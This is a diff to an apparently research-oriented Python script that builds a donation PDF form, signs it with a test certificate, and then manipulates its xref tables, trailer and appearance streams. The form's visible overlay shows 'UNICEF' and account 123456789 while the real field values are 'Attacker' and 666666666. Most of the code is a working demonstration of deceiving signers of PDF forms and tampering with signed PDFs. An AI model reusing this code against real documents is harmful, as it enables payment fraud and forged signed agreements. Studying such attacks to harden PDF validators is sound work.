@@ -1,5 +1,7 @@
 # %%
-pdf_form = "pdf/attack/form/form.pdf"
+filename_unsigned       = "pdf/attack/form/form.pdf"
+filename_signed         = filename_unsigned.replace(".pdf", "-signed.pdf")
+filename_manipulated   = filename_signed.replace(".pdf", "-manipulated.pdf")
 # %%
 from reportlab.pdfgen import canvas
 from reportlab.pdfbase import pdfform
@@ -176,7 +178,7 @@ class MyAcroForm(AcroForm):
         self.fields.append(self.getRef(TF))
         self.checkForceBorder(x,y,width,height,forceBorder,'square',borderStyle,borderWidth,borderColor,fillColor)
 
-    def textfield(self,name,y,value,tooltip,overlay):
+    def textfield(self,name,y,value,tooltip,overlay,fieldFlags=''):
         self._textfield(
                 name=name,
                 value=value,
@@ -187,11 +189,12 @@ class MyAcroForm(AcroForm):
                 textColor=black,
                 borderColor=white, borderWidth=0,
                 forceBorder=False,
-                wkind='textfield'
+                wkind='textfield',
+                fieldFlags=fieldFlags
         )
 
 c = canvas.Canvas(
-    filename=pdf_form,
+    filename=filename_unsigned,
     pageCompression=False
 )
 
@@ -208,11 +211,111 @@ c.drawString(50, 550, 'Amount:')
 form.textfield(name='amount', y=545, value="10 USD", tooltip='Amount', overlay="10 USD",)
 c.drawCentredString(300,500, "Donation Recipient")
 c.drawString(50, 450, 'Recipient Name:')
-form.textfield(name='recipientname', y=445, value="Attacker", tooltip='Recipient Name', overlay="UNICEF",)
+form.textfield(name='recipientname', y=445, value="Attacker", tooltip='Recipient Name', overlay="UNICEF", fieldFlags=0)
 c.drawString(50, 400, 'Sender Bank Account:')
-form.textfield(name='recipientaccount', y=395, value="666666666", tooltip='Sender Bank Account', overlay="123456789")
+form.textfield(name='recipientaccount', y=395, value="666666666", tooltip='Sender Bank Account', overlay="123456789", fieldFlags=0)
 
 
 c.save()
+
+# %%
+import datetime
+from cryptography.hazmat import backends
+from cryptography.hazmat.primitives.serialization import pkcs12
+
+from endesive.pdf import cms
+
+date = datetime.datetime.utcnow() - datetime.timedelta(hours=12)
+date = date.strftime("D:%Y%m%d%H%M%S+00'00'")
+dct = {
+    "aligned": 0,
+    "sigflagsft": 132,
+    "sigpage": 0,
+    "sigbutton": True,
+    "sigfield": "Signature1",
+    "sigandcertify": False,
+    "signaturebox": (350, 350, 520, 300),
+    "signature": "(Signed) I ultimatively agree",
+    "contact": "Signer",
+    "location": "AoE",
+    "signingdate": date,
+    "reason": "No reason given",
+    "password": "1234",
+}
+with open("demo2_user1.p12", "rb") as fp:
+    p12 = pkcs12.load_key_and_certificates(
+        fp.read(), b"1234", backends.default_backend()
+    )
+
+data_unsigned = open(filename_unsigned, "rb").read()
+data_signature = cms.sign(data_unsigned, dct, p12[0], p12[1], p12[2], "sha256")
+with open(filename_signed, "wb") as fp:
+    fp.write(data_unsigned)
+    fp.write(data_signature)
+
+# %%
+from pdfmanipulation import *
+
+filename_signed = "pdf/attack/form/form-signed-updated.pdf"
+data_manipulated = bytearray(open(filename_signed, "rb").read())
+updateXref(pdfbytes=data_manipulated, updatexreftable=[2])
+#print(data_signed)
+with open(filename_manipulated, "wb") as fp:
+    fp.write(data_manipulated)
+
+
+# %%
+filename_signed = "pdf/attack/form/form-signed-updated.pdf"
+data_manipulated = open(filename_signed, "rb").read()
+xref = getXref(data_manipulated)
+print(f"Matches: {len(xref)}")
+for i in range(len(xref)):
+    print(f"Match {i}: {xref[i].start()} - {xref[i].end()}\n{xref[i].group().decode()}")
+
+
+# %%
+filename_signed = "pdf/attack/form/form-signed-updated.pdf"
+data_manipulated = open(filename_signed, "rb").read()
+trailer = getTrailer(data_manipulated)
+print(f"Matches: {len(trailer)}")
+for i in range(len(trailer)):
+    m = trailer[i]
+    print(f"Match {i}: {m.start()} - {m.end()}")
+    print(f"\n{m.group().decode()}")
+
+
+# %%
+from pdfmanipulation import getStartxref
+filename_signed = "pdf/attack/form/form-signed-updated.pdf"
+data_manipulated = open(filename_signed, "rb").read()
+startxref = getStartxref(data_manipulated)
+print(f"Matches: {len(startxref)}")
+for i in range(len(startxref)):
+    m = startxref[i]
+    print(f"Match {i}: {m.start()} - {m.end()}")
+    print(f"\n{m.group().decode()}")
+
+# %%
+b = "Hallo meine welt!".encode()
+b = b.replace("meine".encode(),"schöne".encode())
+print(b)
+
+# %%
+from pdfmanipulation import *
+
+data_manipulated = bytearray(open(filename_signed, "rb").read())
+# overlays = getObjectByNeedle(data_manipulated,"/V \(Attacker\)")
+overlays = getObjectByNeedle(data_manipulated,"(?P<overlay>/AP\s+?<<.*?>>).*Attacker")
+i = 0
+for m in overlays:
+    len = m.end()-m.start()
+    print(f"\n### Match {i}: {m.group('objnr').decode()} {m.group('gennr').decode()} obj")
+    print(f"### Offset: {m.start()} - {m.end()} = {len} Bytes:")
+    #print(f"### Needle: {m.group('needle').decode()}")
+    print(f"{m.group()[:m.start('overlay')]}{m.group()[:m.end('overlay')]}")
+    
+    i += 1
+
+
 
 # %%
